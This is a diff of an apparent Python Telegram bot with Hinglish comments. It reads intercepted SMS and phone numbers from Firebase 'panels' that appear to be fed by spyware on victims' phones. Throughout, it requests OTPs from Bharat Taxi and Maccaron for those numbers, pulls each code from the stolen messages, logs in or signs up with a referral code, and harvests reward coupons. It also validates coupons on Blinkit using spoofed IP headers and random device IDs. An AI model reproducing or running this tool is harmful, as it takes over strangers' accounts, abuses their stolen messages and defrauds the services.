-                  or value.get("Number"))
-        if body is not None:
-            out.append({"body": str(body), "sender": str(sender or "")})
-        else:
-            for v in value.values():
-                out.extend(flatten_sms(v, depth + 1))
-    elif isinstance(value, list):
-        for v in value:
-            out.extend(flatten_sms(v, depth + 1))
+    # Pattern B
+    avail = fb_get(url, "numbers/available", keys)
+    if isinstance(avail, dict):
+        for k in avail.keys():
+            n = re.sub(r"\D", "", str(k))
+            if len(n) >= 10:
+                out.append((n[-10:], n[-10:]))
+    elif isinstance(avail, list):
+        for k in avail:
+            n = re.sub(r"\D", "", str(k))
+            if len(n) >= 10:
+                out.append((n[-10:], n[-10:]))
     return out
 
 
-def is_outgoing_sms(sms_value):
-    """Sent/command SMS ko ignore karo (type=sent, sender 'You', NV# command)."""
-    if not isinstance(sms_value, dict):
-        return False
-    if str(sms_value.get("type", "")).lower() == "sent":
-        return True
-    status = str(sms_value.get("Status") or sms_value.get("status") or "").lower()
-    if status in ("sent done", "sent", "sending"):
-        return True
-    sender = str(sms_value.get("sender") or sms_value.get("from") or "")
-    if sender.lower().startswith("you"):
-        return True
-    body = str(sms_value.get("body") or sms_value.get("message") or "")
-    if body.startswith("NV#") or body.startswith("NV "):
-        return True
-    return False
+def fb_fetch_otp(panel, device_id, timeout=30):
+    """Poll Firebase SMS for the Maccaron OTP message.
 
-
-def sms_dedup_key(sms_key, sms_value):
-    """SMS record ka unique key. Single-slot records (user_sms/{num}, webhookEvent)
-    overwrite hote hain — isliye timestamp/id/body hash bhi mix karte hain."""
-    if isinstance(sms_value, dict):
-        for f in ("timestamp", "id", "message_number", "receivedDate", "formattedTimestamp", "date", "_t"):
-            if f in sms_value and sms_value[f] is not None:
-                return f"{sms_key}|{f}|{sms_value[f]}"
-        body = str(sms_value.get("body") or sms_value.get("message") or "")
-        return f"{sms_key}|{hash(body) & 0xffffffff}"
-    return sms_key
-
-
-def fetch_sms(panel_url, device_id, sms_paths=None, match_number=None):
-    """SMS node read — saare paths MERGE karke ek dict me lao (pehla non-empty
-    path hi mat lo — single-slot records overwrite hote hain). match_number diya
-    ho (Verify_Device style) toh Number field se filter."""
-    paths = list(sms_paths or []) + list(SMS_PATHS)
-    tried = set()
-    merged = {}
-    for path_tpl in paths:
+    Tries both All_Users/sms/{key} and sms/{key} (key = device_id or number)."""
+    url = panel["url"]
+    keys = panel.get("keys", [])
+    candidates = [f"All_Users/sms/{device_id}", f"sms/{device_id}"]
+    # prime 'existing' keys for each candidate
+    existing = {c: set() for c in candidates}
+    for c in candidates:
         try:
-            path = path_tpl.format(dev=device_id) if "{dev}" in path_tpl else path_tpl
+            init = fb_get(url, c, keys, timeout=5)
+            if isinstance(init, dict):
+                existing[c] = set(init.keys())
         except Exception:
-            continue
-        if path in tried:
-            continue
-        tried.add(path)
-        try:
-            if path.lower() == "verify_device" and match_number:
-                r = requests.get(f"{panel_url.rstrip('/')}/Verify_Device.json", timeout=5)
-                if r.status_code == 200:
-                    data = r.json()
-                    if isinstance(data, dict) and data:
-                        clean = re.sub(r"\D", "", match_number)[-10:]
-                        filtered = {k: v for k, v in data.items()
-                                    if isinstance(v, dict)
-                                    and re.sub(r"\D", "", str(v.get("Number", "")))[-10:] == clean}
-                        for k, v in filtered.items():
-                            merged[f"vd|{k}"] = v
-                continue
-            data = fb_get_sync(path, panel_url, timeout=5)
-            if isinstance(data, dict) and data:
-                for k, v in data.items():
-                    merged[f"{path}|{k}"] = v
-        except Exception:
-            continue
-    return merged
-
-
-def extract_nums_from_sms(dev_sms):
-    """SMS sender numbers se numbers nikalna (fallback jab simDetails na ho)."""
-    nums = []
-    for k, v in list(dev_sms.items())[:10]:
-        for parsed in flatten_sms(v):
-            sender = parsed["sender"]
-            m = re.search(r"\d{10,12}", sender)
-            if m:
-                nums.append(m.group(0)[-10:])
-    return list(set(nums))[:3]
-
-
-def check_panel_active(url):
-    """Multiple Firebase structures handle karta hai (lorefer v3 logic):
-      1) NV panels:  All_Users/Data/{dev} -> phoneNumber direct
-      2) spy25:      All_Users/simDetails + All_Users/Data/DeviceInfo
-      3) All_Users/sms: keys device ids hain
-      4) user_sms:   keys device-id ya phone-number (muajob style)
-      5) ufff-style: clients/{dev} -> phoneNumber
-      Devices bina numbers: pehli SMS se number nikaal lo.
-    """
-    data_all = fb_get_sync("All_Users/Data", url)
-    if not isinstance(data_all, dict):
-        data_all = {}
-    device_info_all = fb_get_sync("All_Users/Data/DeviceInfo", url)
-    if not isinstance(device_info_all, dict):
-        device_info_all = {}
-    sim_all = fb_get_sync("All_Users/simDetails", url)
-    if not isinstance(sim_all, dict):
-        sim_all = {}
-    sms_keys = fb_get_sync("All_Users/sms", url)
-    if not isinstance(sms_keys, dict):
-        sms_keys = {}
-    user_sms_keys = fb_get_sync("user_sms", url)
-    if not isinstance(user_sms_keys, dict):
-        user_sms_keys = {}
-    clients_all = fb_get_sync("clients", url)
-    if not isinstance(clients_all, dict):
-        clients_all = {}
-
-    devices = {}
-
-    # ── Method 1 (NV panels): All_Users/Data full — har key device hai ──
-    if data_all:
-        for dev_id, dev in data_all.items():
-            if dev_id in NON_DEVICE_KEYS or not isinstance(dev, dict):
-                continue
-            dev = _unwrap(dev)
-            nums = extract_all_nums(dev)
-            if nums:
-                devices[dev_id] = {
-                    "numbers": nums,
-                    "status": "online",
-                    "sms_paths": [
-                        "user_sms/{dev}",
-                        "All_Users/sms/{dev}",
-                        "All_Users/Data/{dev}/sms",
-                    ],
-                }
-
-    # ── Method 2 (spy25): simDetails + DeviceInfo ─────────────────
-    if sim_all:
-        for dev_id, sim in sim_all.items():
-            sim = _unwrap(sim)
-            if not isinstance(sim, dict):
-                continue
-            info = device_info_all.get(dev_id)
-            info = _unwrap(info) if isinstance(info, dict) else {}
-            if not isinstance(info, dict):
-                info = {}
-            status = str(info.get("Status", "") or "").strip().lower()
-            nums = refer_numbers(sim)
-            if not nums:
-                nums = extract_all_nums(sim, info)
-            if not nums:
-                continue
-            dev = devices.get(dev_id, {
-                "numbers": [], "status": "offline",
-                "sms_paths": ["All_Users/sms/{dev}", "user_sms/{dev}", "All_Users/Data/{dev}/sms"],
-            })
-            if not dev["numbers"]:
-                dev["numbers"] = nums
-            if status in ("online", "1", "true"):
-                dev["status"] = "online"
-            devices[dev_id] = dev
-
-    # ── Method 3: All_Users/sms keys device ids hain (spy25 style) ──
-    if sms_keys:
-        for dev_id in sms_keys:
-            if dev_id in devices or dev_id in NON_DEVICE_KEYS:
-                continue
-            devices[dev_id] = {
-                "numbers": [], "status": "online",
-                "sms_paths": ["All_Users/sms/{dev}", "user_sms/{dev}", "All_Users/Data/{dev}/sms"],
-            }
-
-    # ── Method 4: user_sms keys — device id ya phone number (muajob) ──
-    if user_sms_keys:
-        for k in user_sms_keys:
-            if re.fullmatch(r"\d{10,13}", str(k)):
-                num = str(k)[-10:]
-                fid = f"num|{num}"
-                if fid not in devices:
-                    devices[fid] = {
-                        "numbers": [num], "status": "online",
-                        "sms_paths": [f"user_sms/{k}"],
-                    }
-            elif k not in devices and k not in NON_DEVICE_KEYS:
-                devices[k] = {
-                    "numbers": [], "status": "online",
-                    "sms_paths": ["user_sms/{dev}", "All_Users/sms/{dev}", "All_Users/Data/{dev}/sms"],
-                }
-
-    # ── Method 5 (ufff-style): clients/{dev} -> phoneNumber ─────────
-    if clients_all:
-        for dev_id, dev in clients_all.items():
-            if dev_id in NON_DEVICE_KEYS or not isinstance(dev, dict):
-                continue
-            dev = _unwrap(dev)
-            nums = extract_all_nums(dev)
-            if nums:
-                devices[dev_id] = {
-                    "numbers": nums,
-                    "status": "online",
-                    "sms_paths": ["Verify_Device", "clients/{dev}/webhookEvent", "user_sms/{dev}",
-                                  "All_Users/sms/{dev}", "sms/{dev}"],
-                }
-
-    # ── Bina numbers wale devices: pehli SMS se number nikaalo ──
-    for dev_id in list(devices.keys()):
-        d = devices[dev_id]
-        if d["numbers"]:
-            continue
-        for path_tpl in d.get("sms_paths", []):
+            pass
+    start = time.time()
+    while time.time() - start < timeout:
+        if AUTO_STOP_REQUESTED["v"]:
+            return None
+        for c in candidates:
             try:
-                path = path_tpl.format(dev=dev_id) if "{dev}" in path_tpl else path_tpl
-            except Exception:
-                continue
-            sample = fb_get_sync(path, url)
-            if isinstance(sample, dict):
-                nums = extract_nums_from_sms(sample)
-                if nums:
-                    d["numbers"] = nums
-                    break
-        if not d["numbers"]:
-            del devices[dev_id]
-
-    if not devices:
-        return None
-
-    online_devices = [{"id": k, **v} for k, v in devices.items() if v["status"] == "online"]
-    if not online_devices:
-        online_devices = [{"id": k, **v} for k, v in devices.items()]
-
-    total_nums = sum(len(d["numbers"]) for d in online_devices)
-    if total_nums == 0:
-        return None
-    return {
-        "url": url,
-        "online_devices": online_devices,
-        "total_devices": len(online_devices),
-        "total_numbers": total_nums,
-    }
-
-
-# ═══════════════════════════════════════════════════════════════
-# PANEL CHECKER  (free, koi limit nahi)
-# ═══════════════════════════════════════════════════════════════
-
-def check_panel_status(url):
-    """Ek panel ki status — ACTIVE (numbers mile) / LIVE (DB live, numbers nahi) / DEAD."""
-    try:
-        panel = check_panel_active(url)
-        if panel:
-            return {"url": url, "active": True, "devices": panel["total_devices"],
-                    "numbers": panel["total_numbers"], "state": "ACTIVE"}
-    except Exception:
-        pass
-    try:
-        for probe in ("All_Users", "user_sms", "clients", ""):
-            resp = fb_get_sync(probe, url, timeout=4)
-            if resp is not None:
-                return {"url": url, "active": False, "devices": 0, "numbers": 0, "state": "LIVE"}
-    except Exception:
-        pass
-    return {"url": url, "active": False, "devices": 0, "numbers": 0, "state": "DEAD"}
-
-
-def check_panels_bulk(chat_id, user_id, urls, label):
-    """Sabhi URLs parallel check karke report bhejta hai (free, koi limit nahi)."""
-    total = len(urls)
-    done = 0
-    results = []
-    lines = []
-    with ThreadPoolExecutor(max_workers=16) as ex:
-        futs = {ex.submit(check_panel_status, u): u for u in urls}
-        for fut in as_completed(futs):
-            try:
-                r = fut.result()
-            except Exception:
-                r = {"url": futs[fut], "active": False, "devices": 0, "numbers": 0, "state": "DEAD"}
-            results.append(r)
-            done += 1
-            tag = r["url"].split("//")[1][:34] if "//" in r["url"] else r["url"]
-            lines.append(f"{'✅' if r['active'] else '❌'} {tag}")
-            progress(chat_id, _progress_text(label, done, total, lines))
-    active = [r for r in results if r["active"]]
-    live = [r for r in results if r["state"] == "LIVE"]
-    dead = [r for r in results if r["state"] == "DEAD"]
-    _check_cache[user_id] = {"active": [r["url"] for r in active], "all": urls}
-    msg = (f"🔎 <b>CHECK PANELS — {label}</b> | <code>{done}/{total}</code>\n\n"
-           f"✅ <b>ACTIVE:</b> {len(active)}"
-           f"  |  ⚠️ <b>LIVE (no numbers):</b> {len(live)}"
-           f"  |  ❌ <b>INACTIVE:</b> {len(dead)}\n")
-    if active:
-        msg += "\n✅ <b>ACTIVE PANELS:</b>\n" + "\n".join(
-            f"✅ <code>{html.escape(r['url'][:60])}</code> ({r['devices']} dev / {r['numbers']} num)"
-            for r in active[:12])
-        if len(active) > 12:
-            msg += f"\n... +{len(active) - 12} aur"
-    if dead:
-        msg += "\n\n❌ <b>INACTIVE:</b>\n" + "\n".join(
-            f"❌ <code>{html.escape(r['url'][:60])}</code>" for r in dead[:12])
-        if len(dead) > 12:
-            msg += f"\n... +{len(dead) - 12} aur"
-    kb = InlineKeyboardMarkup(row_width=1)
-    if active:
-        kb.add(btn(f"✅ ADD ACTIVE PANELS ({len(active)})", "add_active", style="success", icon=EMO_GREEN))
-    kb.add(btn(f"📂 ADD ALL ({total})", "add_all_checked", style="primary", icon=EMO_BLUE))
-    kb.add(btn("🏠 HOME", "home", style="danger", icon=EMO_RED))
-    try:
-        BOT.send_message(chat_id, msg, parse_mode="HTML", reply_markup=kb)
-    except Exception:
-        BOT.send_message(chat_id, "🔎 Check done — report bhejte time error aaya.", reply_markup=kb)
-
-
-def extract_bharat_otp(body):
-    if not body or "otp" not in body.lower():
-        return None
-    m = re.search(r'OTP[^.\n]{0,60}?\bis\s*[:=]?\s*(\d{4,6})\b', body, re.IGNORECASE)
-    if m:
-        return m.group(1)
-    m = re.search(r'OTP[^.\n]{0,60}?[:=]\s*(\d{4,6})\b', body, re.IGNORECASE)
-    if m:
-        return m.group(1)
-    if re.search(r'\b(?:is|login|verification|verify|code)\b|[:=]', body, re.IGNORECASE):
-        four = re.findall(r'\b(\d{4})\b', body)
-        if four:
-            return four[0]
-        six = re.findall(r'\b(\d{6})\b', body)
-        if six:
-            return six[0]
-    return None
-
-
-def snapshot_sms_keys(panel_url, device_id, sms_paths=None, phone=None):
-    """OTP bhejne se pehle existing SMS ka dedup-key snapshot le lo —
-    taaki pehle wali purani SMS OTP na bane."""
-    data = fetch_sms(panel_url, device_id, sms_paths, match_number=phone)
-    return {sms_dedup_key(k, v) for k, v in data.items()} if data else set()
-
-
-def fetch_otp_from_sms(panel_url, device_id, known_keys=None, timeout=OTP_TIMEOUT,
-                       sms_paths=None, phone=None):
-    """Fetch OTP from SMS via Firebase REST (multi-path + flatten + outgoing filter)."""
-    existing_keys = set(known_keys) if known_keys else set()
-    if not existing_keys:
-        initial = fetch_sms(panel_url, device_id, sms_paths, match_number=phone)
-        if initial:
-            existing_keys = {sms_dedup_key(k, v) for k, v in initial.items()}
-    start_time = time.time()
-    while time.time() - start_time < timeout:
-        data = fetch_sms(panel_url, device_id, sms_paths, match_number=phone)
-        if data:
-            for sms_key, sms_value in data.items():
-                dkey = sms_dedup_key(sms_key, sms_value)
-                if dkey in existing_keys:
+                data = fb_get(url, c, keys, timeout=5)
+                if not isinstance(data, dict):
                     continue
-                existing_keys.add(dkey)
-                if is_outgoing_sms(sms_value):
-                    continue
-                for parsed in flatten_sms(sms_value):
-                    otp = extract_bharat_otp(parsed["body"])
-                    if otp:
-                        return otp
+                for sms_key, sms_val in data.items():
+                    if sms_key in existing[c]:
+                        continue
+                    if isinstance(sms_val, dict):
+                        body = str(sms_val.get("body") or sms_val.get("message")
+                                   or sms_val.get("text") or "")
+                        otp = extract_maccaron_otp(body)
+                        if otp:
+                            return otp
+                    existing[c].add(sms_key)
+            except Exception:
+                pass
         time.sleep(0.5)
     return None
 
 
-# ═══════════════════════════════════════════════════════════════
-# BHARAT TAXI API
-# ═══════════════════════════════════════════════════════════════
-
-def _bharat_headers(token=None):
-    headers = {
-        "x-rn-version": "--",
-        "x-config-version": "0.0.1",
-        "x-client-version": BHARAT_CLIENT_VERSION,
-        "x-bundle-version": "0.0.10",
-        "x-device": "Redmi/Redmi Note 9 Pro Max/Android v12/excalibur/Handset",
-        "x-package": BHARAT_APP_PACKAGE,
-        "content-type": "application/json",
-        "session_id": str(uuid.uuid4()),
-        "user-agent": BHARAT_USER_AGENT,
-    }
-    if token:
-        headers["token"] = token
-    return headers
-
-
-def bharat_send_otp(mobile):
-    if not BHARAT_SEND_OTP_URL:
-        return False, "BHARAT_SEND_OTP_URL missing"
-    payload = {
-        "merchantId": "BHARAT_TAXI",
-        "mobileNumber": mobile,
-        "mobileCountryCode": "+91",
-        "allowBlockedUserLogin": True,
-        "senderHash": "AEdL582H847",
-    }
+def tg_send(chat_id, text):
+    """Send a Telegram message from any thread (fire-and-forget)."""
     try:
-        resp = requests.post(BHARAT_SEND_OTP_URL, json=payload, headers=_bharat_headers(), timeout=12)
-        if resp.status_code in (200, 201, 202):
-            try:
-                data = resp.json()
-            except Exception:
-                data = {}
-            auth_id = (data.get("authId") if isinstance(data, dict) else None) or None
-            if auth_id:
-                return True, auth_id
-            return False, f"no authId: {resp.text[:120]}"
-        return False, f"HTTP {resp.status_code}: {resp.text[:120]}"
-    except requests.exceptions.ConnectionError:
-        return False, "connection error - api.c2.moving.tech unreachable?"
-    except Exception as exc:
-        return False, f"{type(exc).__name__}: {exc}"
-
-
-def bharat_verify_otp(auth_id, otp):
-    if not BHARAT_VERIFY_OTP_URL:
-        return False, "BHARAT_VERIFY_OTP_URL missing"
-    payload = {"otp": otp, "deviceToken": "dummy"}
-    try:
-        resp = requests.post(BHARAT_VERIFY_OTP_URL.format(auth_id=auth_id), json=payload,
-                             headers=_bharat_headers(), timeout=12)
-        if resp.status_code in (200, 201, 202):
-            try:
-                data = resp.json()
-            except Exception:
-                data = {}
-            if isinstance(data, dict):
-                token = (data.get("token") or data.get("accessToken") or data.get("authToken")
-                         or (data.get("data") and isinstance(data["data"], dict) and data["data"].get("token")))
-                if token:
-                    return True, token
-                return False, f"no token: {resp.text[:120]}"
-            return False, f"bad response: {resp.text[:120]}"
-        return False, f"HTTP {resp.status_code}: {resp.text[:120]}"
-    except requests.exceptions.ConnectionError:
-        return False, "connection error - api.c2.moving.tech unreachable?"
-    except Exception as exc:
-        return False, f"{type(exc).__name__}: {exc}"
-
-
-def bharat_fetch_rewards(token):
-    if not token:
-        return False, None
-    try:
-        resp = requests.get(BHARAT_REWARDS_URL, headers=_bharat_headers(token), timeout=10)
-        if resp.status_code in (200, 201, 202):
-            try:
-                return True, resp.json()
-            except Exception:
-                return True, resp.text
-        return False, None
-    except Exception:
-        return False, None
-
-
-def extract_reward_codes(payload):
-    codes = []
-    code_keys = ("code", "couponcode", "coupon_code", "coupon", "promocode", "promo_code",
-                 "discountcode", "discount_code", "voucher", "amulcode", "amul_code",
-                 "rewardcode", "reward_code", "codetext", "vouchercode", "giftcode")
-    seen = set()
-
-    def amul_coupon(node):
-        if isinstance(node, dict):
-            if str(node.get("campaignName", "")) == "AMUL Ice Cream Offer":
-                c = node.get("couponCode") or node.get("coupon") or node.get("code")
-                if c and str(c).strip():
-                    return str(c).strip()
-            for v in node.values():
-                r = amul_coupon(v)
-                if r:
-                    return r
-        elif isinstance(node, list):
-            for item in node:
-                r = amul_coupon(item)
-                if r:
-                    return r
-        return None
-
-    amul = amul_coupon(payload)
-    if amul:
-        return [amul]
-
-    def walk(node):
-        if isinstance(node, dict):
-            for k, v in node.items():
-                if isinstance(v, str) and k.lower() in code_keys and v.strip():
-                    clean = v.strip()
-                    if clean.upper() not in seen and len(clean) <= 30:
-                        seen.add(clean.upper())
-                        codes.append(clean)
-                walk(v)
-        elif isinstance(node, list):
-            for item in node:
-                walk(item)
-
-    walk(payload)
-    if not codes and isinstance(payload, (str, bytes)):
-        text = payload if isinstance(payload, str) else payload.decode("utf-8", "ignore")
-        m = re.search(r'Reward Code[^:]*:\s*([A-Za-z0-9\-_]+)', text, re.IGNORECASE)
-        if m and m.group(1).upper() not in seen:
-            codes.append(m.group(1))
-    if not codes:
-        try:
-            text = json.dumps(payload, default=str)
-        except Exception:
-            text = str(payload)
-        found = re.findall(r'\bBLAMUL[A-Z0-9]{6,15}\b', text)
-        if not found:
-            found = re.findall(r'\bBLA[A-Z0-9]{10,16}\b', text)
-        for c in found:
-            if c.upper() not in seen:
-                seen.add(c.upper())
-                codes.append(c)
-    return list(dict.fromkeys(codes))
-
-
-# ═══════════════════════════════════════════════════════════════
-# BLINKIT COUPON CHECKER  (blinkitcheck.py port)
-# ═══════════════════════════════════════════════════════════════
-
-def _blinkit_session():
-    try:
-        with open(BLINKIT_SESSION_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except Exception:
-        return {}
-
-
-def _blinkit_save_session(data):
-    with _blinkit_lock:
-        try:
-            with open(BLINKIT_SESSION_FILE, "w", encoding="utf-8") as f:
-                json.dump(data, f, indent=4)
-        except Exception:
-            pass
-
-
-def blinkit_logged_in():
-    s = _blinkit_session()
-    return bool(s.get("access_token") and s.get("cart_id") and s.get("base_payload"))
-
-
-def _blinkit_headers(token=None, fixed_device=False):
-    rip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
-    if fixed_device:
-        dev_id, sess_uuid, adv_id = _FIXED_DEVICE_ID, _FIXED_SESSION_UUID, _FIXED_ADV_ID
-    else:
-        dev_id = "".join(random.choices("0123456789abcdef", k=16))
-        sess_uuid = str(uuid.uuid4())
-        adv_id = str(uuid.uuid4())
-    headers = {
-        "host_app": "blinkit", "version_name": "18.9.3",
-        "app_client": "consumer_android", "app_version": "80180093",
-        "version_code": "80180093", "qd_sdk_request": "true",
-        "auth_key": "45bff2b1437ff764d5e5b9b292f9771428e18fc40b7f3b7303d196ea84ab4341",
-        "qd_sdk_version": "1", "rn_bundle_version": "1009002001",
-        "app_api_version": "34", "X-APP-THEME": "default",
-        "X-APP-APPEARANCE": "LIGHT", "X-SYSTEM-APPEARANCE": "LIGHT",
-        "Accept": "application/json", "screen_density": "1080px",
-        "screen_density_num": "3.0", "cpu-level": "AVERAGE",
-        "memory-level": "AVERAGE", "storage-level": "EXCELLENT",
-        "network-level": "HIGH", "battery-level": "EXCELLENT",
-        "is_accessibility_enabled": "false",
-        "lat": "24.567459", "lon": "73.69950399999999",
-        "screen-width": "360.0", "screen-height": "616.0",
-        "entry_source": "default",
-        "session_uuid": sess_uuid,
-        "device_id": dev_id,
-        "advertising_id": adv_id,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "com.grofers.customerapp/280180093 (Linux; U; Android 14; en; SM-X710N; Build/UQ1A.240205.06151050; Cronet/126.0.6452.4)",
-        "X-Forwarded-For": rip, "X-Real-IP": rip,
-    }
-    if token:
-        headers["Authorization"] = token
-        headers["access_token"] = token
-        headers["Content-Type"] = "application/json; charset=UTF-8"
-    return headers
-
-
-def blinkit_request_otp(phone):
-    if not CFFI_OK:
-        return False, "curl_cffi install nahi hai (pip install curl_cffi)"
-    try:
-        resp = _cffi_session.post(
-            f"{BLINKIT_BASE_URL}/v2/accounts/",
-            data=f"country_code=91&otp_mode=SMS&user_phone={phone}&build_variant=release",
-            headers=_blinkit_headers(fixed_device=True), timeout=10,
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": chat_id, "text": text,
+                  "parse_mode": "HTML", "disable_web_page_preview": True},
+            timeout=10,
         )
-        if resp.status_code != 200:
-            return False, f"HTTP {resp.status_code}"
-        data = resp.json()
-        if data.get("sms_sent"):
-            return True, "OTP sent!"
-        return False, f"OTP error: {data}"
-    except Exception as e:
-        return False, str(e)
-
-
-def blinkit_verify_otp(phone, otp):
-    if not CFFI_OK:
-        return None, "curl_cffi install nahi hai (pip install curl_cffi)"
-    try:
-        resp = _cffi_session.post(
-            f"{BLINKIT_BASE_URL}/v2/accounts/verify/phone/code/",
-            data=(f"country_code=91&otp_mode=SMS&user_phone={phone}&verify_code={otp}"
-                  f"&adv_id={_FIXED_ADV_ID}&notification_permission_enabled=false"),
-            headers=_blinkit_headers(fixed_device=True), timeout=10,
-        )
-        if resp.status_code != 200:
-            return None, f"HTTP {resp.status_code}"
-        data = resp.json()
-        if data.get("success") and "access_token" in data:
-            return data["access_token"], "Login Successful!"
-        return None, f"Failed: {data}"
-    except Exception as e:
-        return None, str(e)
-
-
-def blinkit_get_active_cart(token):
-    addr_id = None
-    try:
-        resp = _cffi_session.get(
-            f"{BLINKIT_BASE_URL}/v4/address?source=SOURCE_CART&address_id=-1&is_locality_selected_by_user=false",
-            headers=_blinkit_headers(token, fixed_device=True), timeout=10,
-        )
-        if resp.status_code == 200:
-            data = resp.json()
-            if data.get("addresses"):
-                addr_id = data["addresses"][0]["id"]
     except Exception:
         pass
-    try:
-        resp = _cffi_session.post(
-            f"{BLINKIT_BASE_URL}/v5/carts",
-            json={"is_initial_call": True, "cart_type": "product"},
-            headers=_blinkit_headers(token, fixed_device=True), timeout=10,
-        )
-        if resp.status_code == 200:
-            cart_id = resp.json().get("cart_id")
-            if cart_id and addr_id:
-                return cart_id, addr_id
-    except Exception:
-        pass
-    return None, None
 
 
-def blinkit_check_coupon(coupon, token, cart_id, base_payload):
-    """Returns (status, details): VALID | POTENTIAL | INVALID | ERROR"""
-    if not CFFI_OK:
-        return "ERROR", "curl_cffi missing (pip install curl_cffi)"
-    p = base_payload.copy()
-    p["promo_codes"] = [coupon]
-    url = f"{BLINKIT_BASE_URL}/v5/carts/{cart_id}"
-    for attempt in range(3):
-        try:
-            resp = _cffi_session.patch(url, json=p,
-                                       headers=_blinkit_headers(token), timeout=15)
-            if resp.status_code == 200:
-                data = resp.json()
-                promo = data.get("cart_data", {}).get("promo_details", {})
-                if promo.get("promo_applied") is True:
-                    return "VALID", {"discount": promo.get("discount", 0),
-                                     "cashback": promo.get("promo_cashback", 0),
-                                     "message": promo.get("message", "")}
-                for s in data.get("snippets", []):
-                    sl = str(s).lower()
-                    if "add items worth" in sl or "more to apply" in sl or "minimum" in sl:
-                        return "POTENTIAL", "Cart value zyada chahiye"
-                return "INVALID", "Coupon kaam nahi kiya"
-            elif resp.status_code == 429:
-                time.sleep(3 * (attempt + 1))
-                continue
-            else:
-                return "ERROR", f"HTTP {resp.status_code}"
-        except Exception:
-            time.sleep(1)
+def auto_run(user_id, chat_id, referral_code, max_count=None):
+    """Automation loop: for every device/number in Firebase panels,
+    send Maccaron OTP -> fetch OTP from Firebase SMS -> verify+signup
+    using the user's Maccaron referral code."""
+    AUTO_RUNNING["v"] = True
+    AUTO_STOP_REQUESTED["v"] = False
+    total = ok = fail = 0
+    tg_send(chat_id,
+            f"🤖 <b>Automation Started</b>\nReferral code: <code>{referral_code}</code>\n"
+            f"Panels loaded: {len(FIREBASE_PANELS)}\nSend /autostop to halt.")
+    for panel in FIREBASE_PANELS:
+        if AUTO_STOP_REQUESTED["v"]:
+            break
+        nums = fb_discover_numbers(panel)
+        if not nums:
             continue
-    return "ERROR", "Max retries - server busy"
-
-
-def _blinkit_reset_cart(token, cart_id, base_payload):
-    try:
-        p = base_payload.copy()
-        p["promo_codes"] = []
-        _cffi_session.patch(f"{BLINKIT_BASE_URL}/v5/carts/{cart_id}",
-                            json=p, headers=_blinkit_headers(token), timeout=10)
-    except Exception:
-        pass
-
-
-def check_code_with_blinkit(code):
-    """Auto-check a code with the admin Blinkit session.
-    Returns (status, line) where line is ready for Telegram."""
-    if not blinkit_logged_in():
-        return "ERROR", "⚠️ Blinkit session not logged in (admin /blinkitlogin)"
-    s = _blinkit_session()
-    token = s["access_token"]
-    cart_id = s["cart_id"]
-    base_payload = s.get("base_payload")
-    status, details = blinkit_check_coupon(code, token, cart_id, base_payload)
-    with _blinkit_lock:
-        BLINKIT_STATS["checked"] += 1
-        if status == "VALID":
-            BLINKIT_STATS["valid"] += 1
-            line = (f"✅ <b>VALID</b> 💰 ₹{details['discount']} off"
-                    f" | 🪙 CB ₹{details['cashback']}")
-            _blinkit_reset_cart(token, cart_id, base_payload)
-        elif status == "POTENTIAL":
-            BLINKIT_STATS["potential"] += 1
-            line = f"⚠️ <b>POTENTIAL</b> - {details}"
-        elif status == "INVALID":
-            BLINKIT_STATS["invalid"] += 1
-            line = "❌ <b>INVALID</b> - coupon kaam nahi kiya"
-        else:
-            BLINKIT_STATS["errors"] += 1
-            line = f"🔴 <b>CHECK ERROR</b> - {details}"
-    return status, line
-
-
-# ═══════════════════════════════════════════════════════════════
-# PROGRESS + RUN ENGINE
-# ═══════════════════════════════════════════════════════════════
-
-_progress_msgs = {}
-
-
-def progress(chat_id, text):
-    msg_id = _progress_msgs.get(chat_id)
-    try:
-        if msg_id:
-            BOT.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML")
-        else:
-            m = BOT.send_message(chat_id, text, parse_mode="HTML")
-            _progress_msgs[chat_id] = m.message_id
-    except Exception:
-        try:
-            m = BOT.send_message(chat_id, text, parse_mode="HTML")
-            _progress_msgs[chat_id] = m.message_id
-        except Exception:
-            pass
-
-
-def _progress_text(label, done, total, lines):
-    head = f"🎯 <b>{html.escape(label)}</b> | <code>{done}/{total}</code>"
-    block = []
-    for line in reversed(lines):
-        if len("\n".join(block + [line])) > 3500:
-            break
-        block.append(line)
-    block.reverse()
-    if not block:
-        return head
-    return head + "\n" + "\n".join(block)
-
-
-def fmt_line(mobile, status, codes=None, device_id=""):
-    icon = "✅" if status == "Success" else ("🎁" if status == "Reward" else "❌")
-    line = f"{icon} <code>{mobile}</code> - {status}"
-    if codes:
-        line += f" 🔑 <code>{', '.join(codes[:5])}</code>"
-    if device_id:
-        line += f"\n  🆔 <code>{device_id}</code>"
-    return line
-
-
-def process_panel(chat_id, user_id, panel_url):
-    label = panel_url.split("//")[1][:50] if "//" in panel_url else panel_url
-    progress(chat_id, f"🔍 <b>Checking panel...</b>\n<code>{html.escape(label)}</code>")
-    panel = check_panel_active(panel_url)
-    if not panel:
-        progress(chat_id, f"❌ <b>Panel inactive / no numbers</b>\n<code>{html.escape(label)}</code>")
-        return
-    devices = panel["online_devices"]
-    total_nums = panel["total_numbers"]
-    progress(chat_id,
-             f"📡 <b>Panel Active</b>\n<code>{html.escape(label)}</code>\n"
-             f"Devices: {len(devices)} | Numbers: {total_nums}\n\n🔄 Processing...")
-    lines = []
-    done = 0
-    found = []
-    for dev in devices:
-        dev_id = dev["id"]
-        dev_sms_paths = dev.get("sms_paths")
-        for mobile in dev["numbers"]:
-            done += 1
-            new_codes = []
-            status = "done"
-            known_sms = snapshot_sms_keys(panel_url, dev_id, dev_sms_paths, mobile)
-            try:
-                ok, auth_id = bharat_send_otp(mobile)
-                if not ok:
-                    status = f"OTP send fail ({auth_id[:60]})"
-                else:
-                    otp = fetch_otp_from_sms(panel_url, dev_id, known_keys=known_sms,
-                                             timeout=OTP_TIMEOUT, sms_paths=dev_sms_paths, phone=mobile)
-                    if not otp:
-                        status = "OTP timeout"
-                    else:
-                        ok, token = bharat_verify_otp(auth_id, otp)
-                        if not ok:
-                            status = f"Login fail ({token[:60]})"
-                        else:
-                            ok, rewards = bharat_fetch_rewards(token)
-                            new_codes = [c for c in extract_reward_codes(rewards) if not seen_code(c)] if ok else []
-                            if new_codes:
-                                status = "Reward"
-                                for c in new_codes:
